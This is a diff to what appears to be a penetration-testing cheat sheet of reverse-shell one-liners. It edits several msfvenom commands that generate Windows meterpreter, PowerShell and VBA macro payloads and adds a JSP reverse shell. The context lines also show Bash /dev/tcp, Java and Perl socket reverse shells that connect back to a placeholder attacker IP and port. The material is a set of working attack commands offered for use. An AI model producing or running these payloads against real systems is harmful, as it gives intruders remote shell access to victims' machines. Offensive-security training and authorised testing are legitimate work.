@@ -4,22 +4,25 @@ $ IP: for adaptername in $(for i in "$(ip a s | sort -r | grep -E $'[[:digit:]]:
 
 
 # x86 normal
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<port> -f exe > shell.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<port> -f exe
 
 # x64 (CMD Single Stage)
-msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<port> -f exe > shell.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<port> -f exe
 
 # reverse HTTP
-msfvenom -p windows/meterpreter/reverse_http LHOST=<IP> LPORT=<port> -f exe > shell.exe
+msfvenom -p windows/meterpreter/reverse_http LHOST=<IP> LPORT=<port> -f exe 
 
 # reverse HTTPS
-msfvenom -p windows/meterpreter/reverse_https LHOST=<IP> LPORT=<port> -f exe > shell.exe
+msfvenom -p windows/meterpreter/reverse_https LHOST=<IP> LPORT=<port> -f exe 
 
 # Powershell Payload
-msfvenom -p cmd/windows/reverse_powershell LHOST=<IP> LPORT=<port> > shell.ps1
+msfvenom -p cmd/windows/reverse_powershell LHOST=<IP> LPORT=<port>
 
 # Macro Payload
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<port> -f vba
+
+# JSP rev shell (msfvenom)
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<port> -f raw
 
 # Bash RevShell
 bash -i >& /dev/tcp/<IP>/<port> 0>&1
@@ -50,3 +53,4 @@ String host=<IP>;int port=<port>;String cmd="sh";Process p=new ProcessBuilder(cm
 
 # Perl Rev Shell
 perl -e 'use Socket;$i="<IP>";$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("<shell> -i");};'
+
